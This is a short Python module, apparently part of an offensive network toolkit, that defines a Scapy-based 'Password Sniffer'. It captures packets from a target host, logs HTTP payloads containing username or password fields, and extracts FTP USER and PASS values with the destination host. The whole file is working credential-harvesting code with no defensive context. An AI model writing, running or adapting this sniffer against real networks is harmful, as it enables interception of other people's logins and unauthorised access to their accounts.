import stream
import util
from sniffer import Sniffer
from re import findall
from scapy.all import *

__name__ = "Password Sniffer"
class PasswordSniffer(Sniffer):
	""" Sniff and parse passwords from various protocols """
	def __init__(self):
		super(PasswordSniffer, self).__init__('Password')

	def initialize(self):
		""" initialize sniffer """
		tmp = raw_input('[!] Sniff passwords from %s.  Is this correct? '%self.source)
		if 'n' in tmp.lower():
			return None

		self.sniff_filter = "src %s"%self.source
		self.sniff = True
		self.sniff_thread.start()
		return self.source
	
	def dump(self, pkt):
		"""Packet callback; parse packets"""
		if not pkt is None:
			# http
			if pkt.haslayer(TCP) and pkt.getlayer(TCP).dport == 80 and pkt.haslayer(Raw):
				payload = pkt.getlayer(Raw).load
				if 'username' in payload or 'password' in payload:
					self.log_msg(str(payload))
			# ftp
			elif pkt.haslayer(TCP) and pkt.getlayer(TCP).dport == 21:
				payload = str(pkt.sprintf("%Raw.load%"))
				# strip control characters
				payload = payload[:-5] 
				prnt = None
				if 'USER' in payload:
					prnt = "Host: %s\n[!] User: %s "%(pkt[IP].dst,findall("(?i)USER (.*)", payload)[0])
				elif 'PASS' in payload:
					prnt = 'Pass: %s'%findall("(?i)PASS (.*)", payload)[0]
				if not prnt is None:
					self.log_msg(prnt)
			# TODO: other protos....
